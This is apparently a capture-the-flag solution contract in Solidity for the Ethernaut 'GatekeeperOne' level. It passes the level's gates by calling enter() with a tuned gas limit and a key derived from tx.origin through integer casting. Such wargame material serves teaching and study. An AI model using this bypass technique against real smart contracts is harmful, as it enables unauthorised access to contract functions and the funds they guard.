// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../ethernaut/levels/GatekeeperOne.sol';

contract GatekeeperOneSolution {
  GatekeeperOne target;
  constructor(address targetAddress) {
    target = GatekeeperOne(targetAddress);
  }

  function exploit(uint gasLimit) external {
    target.enter{gas: gasLimit}(
      bytes8(uint64(uint16(uint160(bytes20(tx.origin)))) + uint64(bytes8(hex"0000001100000000"))));
  }
}